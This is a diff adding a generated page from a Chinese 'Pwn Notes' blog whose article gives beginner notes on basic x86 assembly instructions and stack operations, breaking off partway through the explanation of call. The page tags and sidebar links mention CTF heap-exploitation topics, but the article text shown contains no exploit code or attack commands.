@@ -1,0 +1,2337 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/pwn-notes/img/fluid.png">
+  <link rel="icon" href="/pwn-notes/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="henan808">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="pwn 汇编语言：1.add    sub  mov  lea  jmp  call  ret  leave  push  pop  xor算术运算： add a,b; &#x3D;&#x3D;  a&#x3D;a+b; sub a,b;&#x3D;&#x3D; a&#x3D;a-b; 数据搬运：eax,ebx都是寄存器 mov a,b;&#x3D;&#x3D; 将右边的值赋给左边，如果右边的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="汇编语言：">
+<meta property="og:url" content="https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-asm-65de1e22-741369/index.html">
+<meta property="og:site_name" content="Pwn Notes">
+<meta property="og:description" content="pwn 汇编语言：1.add    sub  mov  lea  jmp  call  ret  leave  push  pop  xor算术运算： add a,b; &#x3D;&#x3D;  a&#x3D;a+b; sub a,b;&#x3D;&#x3D; a&#x3D;a-b; 数据搬运：eax,ebx都是寄存器 mov a,b;&#x3D;&#x3D; 将右边的值赋给左边，如果右边的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260413202248151.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260414225121242.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260414165326655.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260717190311647.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260722191820500.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260722192005255.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260422163347692.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260521103002737.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260717100054314.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260717100149363.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260717100633970.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260714093337581.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260718170212062.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260719103800504.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260719102919798.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260719110140358.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260716200102780.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260716201327296.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260716201524666.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260722094230638.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260728152239012.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260728152315412.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260728160524639.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260728161502026.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260728161547343.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260728161616506.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808105457634.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808105545821.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808110645569.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808110707989.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808110949840.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808111309282.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808112100305.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808113025575.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808113144706.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808113200822.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808113508822.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808113806926.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808113200822.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808143936540.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808143952606.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808145103762.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808145601427.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808145634238.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808151941812.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808152522384.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260808155100040.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260907152500907.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260907155212679.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260911162106494.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260908181557774.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260908182137790.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260908182957715.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260908183609761.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260921192820322.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260921192908954.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260921192956179.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260909182716534.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260925090501719.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260925093423176.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020152423105.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020152721386.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020153643944.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020183317059.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020183419817.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020184520380.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020184644479.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020185648382.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020185905641.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020190233294.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020190439781.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020200402906.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020200455373.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020200531329.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020200637985.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020200752525.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020201142612.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020202018078.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020202518484.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020202451029.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020203353418.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020202910060.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020202924513.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020204038141.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020204120994.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261020210220092.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261023174746497.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261023175148105.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261023175647625.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260925165434749.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261021202354789.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261021202719014.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261021203152520.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261021203327613.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261021203730662.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261021205800532.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261021210422251.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260928164112360.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260928171607588.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260928171912261.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260928173414990.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260928174518533.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260928174936848.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260928175511630.png">
+<meta property="article:published_time" content="2026-11-13T11:13:26.000Z">
+<meta property="article:modified_time" content="2026-11-13T11:25:07.953Z">
+<meta property="article:author" content="henan808">
+<meta property="article:tag" content="tcache">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="unlink">
+<meta property="article:tag" content="fastbin">
+<meta property="article:tag" content="unsorted-bin">
+<meta property="article:tag" content="double-free">
+<meta property="article:tag" content="HouseOfForce">
+<meta property="article:tag" content="one-gadget">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20260413202248151.png">
+  
+  
+  
+  <title>汇编语言： - Pwn Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/pwn-notes/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/pwn-notes/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/pwn-notes/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"henan808.github.io","root":"/pwn-notes/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/pwn-notes/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/pwn-notes/js/utils.js" ></script>
+  <script  src="/pwn-notes/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/pwn-notes/">
+      <strong>Pwn Notes</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/pwn-notes/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="汇编语言："></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        henan808
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-11-13 19:13" pubdate>
+          2026-11-13 19:13
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          28k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          231 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="知识点"
+        id="heading-4648a1c11156ccf26f29caa7976dab4b" role="tab" data-toggle="collapse" href="#collapse-4648a1c11156ccf26f29caa7976dab4b"
+        aria-expanded="true"
+      >
+        知识点
+        <span class="list-group-count">(9)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-4648a1c11156ccf26f29caa7976dab4b"
+           role="tabpanel" aria-labelledby="heading-4648a1c11156ccf26f29caa7976dab4b">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Misc"
+        id="heading-74248c725e00bf9fe04df4e35b249a19" role="tab" data-toggle="collapse" href="#collapse-74248c725e00bf9fe04df4e35b249a19"
+        aria-expanded="false"
+      >
+        Misc
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-74248c725e00bf9fe04df4e35b249a19"
+           role="tabpanel" aria-labelledby="heading-74248c725e00bf9fe04df4e35b249a19">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-misc-misc-ff2821/" title="misc"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">misc</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ROP"
+        id="heading-e506eff6ed537e408a9d885bb307f5fc" role="tab" data-toggle="collapse" href="#collapse-e506eff6ed537e408a9d885bb307f5fc"
+        aria-expanded="false"
+      >
+        ROP
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-e506eff6ed537e408a9d885bb307f5fc"
+           role="tabpanel" aria-labelledby="heading-e506eff6ed537e408a9d885bb307f5fc">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-rop-1-rop-64-libc-6c7ee7/" title="1.rop（64位泄露libc和）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">1.rop（64位泄露libc和）</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="堆"
+        id="heading-8b1fa850914185f78f36fd9a8b716ba4" role="tab" data-toggle="collapse" href="#collapse-8b1fa850914185f78f36fd9a8b716ba4"
+        aria-expanded="false"
+      >
+        堆
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-8b1fa850914185f78f36fd9a8b716ba4"
+           role="tabpanel" aria-labelledby="heading-8b1fa850914185f78f36fd9a8b716ba4">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-easy-heap-7b39ae/" title="EASY HEAP"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">EASY HEAP</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-canary-70aabd/" title="canary"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">canary</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/glibc-heap-chunk-and-bins/" title="glibc 堆基础：chunk 结构、request2size 与 bins"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">glibc 堆基础：chunk 结构、request2size 与 bins</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="实验"
+        id="heading-9f50ccd8efc555216580ff1a87051f5a" role="tab" data-toggle="collapse" href="#collapse-9f50ccd8efc555216580ff1a87051f5a"
+        aria-expanded="false"
+      >
+        实验
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-9f50ccd8efc555216580ff1a87051f5a"
+           role="tabpanel" aria-labelledby="heading-9f50ccd8efc555216580ff1a87051f5a">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-lab-3e6b5dbe-796abc/" title="实验1模板"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">实验1模板</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="未分类"
+        id="heading-ecf7ebb59328ebf2369ce693a2423566" role="tab" data-toggle="collapse" href="#collapse-ecf7ebb59328ebf2369ce693a2423566"
+        aria-expanded="false"
+      >
+        未分类
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-ecf7ebb59328ebf2369ce693a2423566"
+           role="tabpanel" aria-labelledby="heading-ecf7ebb59328ebf2369ce693a2423566">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-bcloudbctf2016-378ff1/" title="bcloudbctf2016"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">bcloudbctf2016</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="汇编"
+        id="heading-ef3380de76fd90069a3644053bc3379d" role="tab" data-toggle="collapse" href="#collapse-ef3380de76fd90069a3644053bc3379d"
+        aria-expanded="true"
+      >
+        汇编
+        <span class="list-group-count">(2)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-ef3380de76fd90069a3644053bc3379d"
+           role="tabpanel" aria-labelledby="heading-ef3380de76fd90069a3644053bc3379d">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-asm-off-by-null-6cd392/" title="off by null"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">off by null</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-asm-65de1e22-741369/" title="汇编语言："
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">汇编语言：</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">汇编语言：</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
+<!-- sync-source: notes/external/typora-asm/汇编语言：.md#0 -->
+<p>pwn</p>
+<h2 id="汇编语言："><a href="#汇编语言：" class="headerlink" title="汇编语言："></a>汇编语言：</h2><h3 id="1-add-sub-mov-lea-jmp-call-ret-leave-push-pop-xor"><a href="#1-add-sub-mov-lea-jmp-call-ret-leave-push-pop-xor" class="headerlink" title="1.add    sub  mov  lea  jmp  call  ret  leave  push  pop  xor"></a>1.add    sub  mov  lea  jmp  call  ret  leave  push  pop  xor</h3><p>算术运算：</p>
+<p>add a,b; &#x3D;&#x3D;  a&#x3D;a+b;</p>
+<p>sub a,b;&#x3D;&#x3D; a&#x3D;a-b;</p>
+<p>数据搬运：eax,ebx都是寄存器</p>
+<p>mov a,b;&#x3D;&#x3D; 将右边的值赋给左边，如果右边的是一个地址，那么就是将右边地址中存储的数赋值给左边；</p>
+<p>lea eax,[ebx+4];&#x3D;&#x3D;就是算地址，ebx+4赋值给eax;</p>
+<p>跳转</p>
+<p>jmp a;&#x3D;&#x3D;直接跳到a位置；</p>
+<p>栈操作：esp:栈顶指针   一个寄存器，一个栈单元的大小都是4字节；</p>
+<p>push eax&#x3D;&#x3D;向栈中放数据</p>
+<p>esp-4;</p>
+<p>esx放进去之后，现在的栈顶指针就指向eax;</p>
+<p>pop ebx&#x3D;&#x3D;从栈中拿数据</p>
+<p>因为现在栈顶esp指向一个数据，于是先mov ebx,esp;</p>
+<p>​                                                        之后esp+4;</p>
+<p>函数与栈调用：</p>
+<p>call func;&#x3D;&#x3D;调用这个func函数；</p>
+<p>首先会在当前指令下的下一条指令压栈，（就是在函数调用完之后还是会回来接着调用接下来的命令，栈就是先进后出，于是函数调用完后便可以运行接下来的命令）</p>
